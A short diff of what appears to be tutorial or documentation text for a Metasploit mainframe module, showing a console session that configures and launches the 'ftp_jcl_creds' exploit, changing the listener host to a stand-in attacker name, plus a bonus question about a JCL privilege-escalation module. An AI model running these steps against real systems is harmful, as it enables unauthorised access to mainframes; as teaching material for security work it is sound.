@@ -14,8 +14,8 @@ msf exploit(ftp_jcl_creds) > set rhost <host>m
 rhost => <host>
 msf exploit(ftp_jcl_creds) > set rport <port>
 rport => <port>
-msf exploit(ftp_jcl_creds) > set lhost 10.10.10.10
-lhost => 10.10.10.10
+msf exploit(ftp_jcl_creds) > set lhost evilmf
+lhost => evilmf
 msf exploit(ftp_jcl_creds) > exploit
 
 Bonus: What does the apf_privesc_jcl do and how can you use it?
